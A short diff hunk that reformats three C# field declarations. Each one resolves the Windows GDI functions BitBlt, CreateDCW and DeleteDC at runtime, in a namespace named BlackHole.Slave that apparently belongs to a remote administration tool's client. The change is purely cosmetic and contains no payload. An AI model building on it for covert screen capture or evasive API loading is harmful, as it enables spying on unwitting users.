@@ -22,8 +22,13 @@ namespace BlackHole.Slave.Helper.Native.Impl
         [UnmanagedFunctionPointer(CallingConvention.Winapi, CharSet = CharSet.Auto)]
         public delegate bool dDeleteDC([In] IntPtr hdc);
 
-        public static dBitBlt BitBlt = Instance.FindUmanagedFunction<dBitBlt>("BitBlt");
-        public static dCreateDC CreateDC = Instance.FindUmanagedFunction<dCreateDC>("CreateDCW");
-        public static dDeleteDC DeleteDC = Instance.FindUmanagedFunction<dDeleteDC>("DeleteDC");
+        public static dBitBlt BitBlt = 
+            Instance.FindUmanagedFunction<dBitBlt>("BitBlt");
+
+        public static dCreateDC CreateDC = 
+            Instance.FindUmanagedFunction<dCreateDC>("CreateDCW");
+
+        public static dDeleteDC DeleteDC = 
+            Instance.FindUmanagedFunction<dDeleteDC>("DeleteDC");
     }
 }
